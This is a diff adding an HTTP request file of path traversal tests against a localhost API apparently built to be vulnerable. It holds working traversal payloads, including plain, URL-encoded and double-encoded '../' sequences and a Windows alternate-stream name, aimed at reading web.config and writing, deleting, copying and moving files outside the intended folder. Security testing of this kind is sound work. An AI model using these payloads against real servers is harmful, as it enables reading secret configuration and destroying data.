@@ -1,0 +1,79 @@
+### Test Path Traversal
+
+# Baseline Test - Read normal file
+GET https://localhost:44351/api/path-traversal/read?file=test.txt
+
+### Test Path Traversal
+
+# Read file with directory traversal
+GET https://localhost:44351/api/path-traversal/read?file=../../../web.config
+
+### Test Path Traversal
+
+# List files with directory traversal
+GET https://localhost:44351/api/path-traversal/list?dir=../../../
+
+### Test Path Traversal
+
+# Write file with directory traversal
+GET https://localhost:44351/api/path-traversal/write?file=../../../hack.txt&content=hacked
+
+### Test Path Traversal
+
+# Delete file with directory traversal
+GET https://localhost:44351/api/path-traversal/delete?file=../../../important.txt
+
+### Test Path Traversal
+
+# Copy file with directory traversal
+GET https://localhost:44351/api/path-traversal/copy?source=secret.txt&dest=../../../stolen.txt
+
+### Test Path Traversal
+
+# Move file with directory traversal
+GET https://localhost:44351/api/path-traversal/move?source=secret.txt&dest=../../../moved.txt
+
+### Test Path Traversal
+
+# List directories with traversal
+GET https://localhost:44351/api/path-traversal/list-directories?dir=../../../
+
+### Test Path Traversal
+
+# Create directory with traversal
+GET https://localhost:44351/api/path-traversal/create-directory?dir=../../../hack
+
+### Test Path Traversal
+
+# Delete directory with traversal
+GET https://localhost:44351/api/path-traversal/delete-directory?dir=../../../temp
+
+### Test Path Traversal
+
+# Get full path with traversal
+GET https://localhost:44351/api/path-traversal/full-path?path=../../../
+
+### Test Path Traversal
+
+# Open file with traversal
+GET https://localhost:44351/api/path-traversal/open?file=../../../web.config
+
+### Test Path Traversal
+
+# Unicode encoded traversal
+GET https://localhost:44351/api/path-traversal/read?file=%2E%2E%2F%2E%2E%2F%2E%2E%2Fweb.config
+
+### Test Path Traversal
+
+# Double encoded traversal
+GET https://localhost:44351/api/path-traversal/read?file=%252E%252E%252F%252E%252E%252F%252E%252E%252Fweb.config
+
+### Test Path Traversal
+
+# Using forward slashes
+GET https://localhost:44351/api/path-traversal/read?file=..%2F..%2F..%2Fweb.config
+
+### Test Path Traversal
+
+# Using Windows alternative streams
+GET https://localhost:44351/api/path-traversal/read?file=test.txt:secret.txt
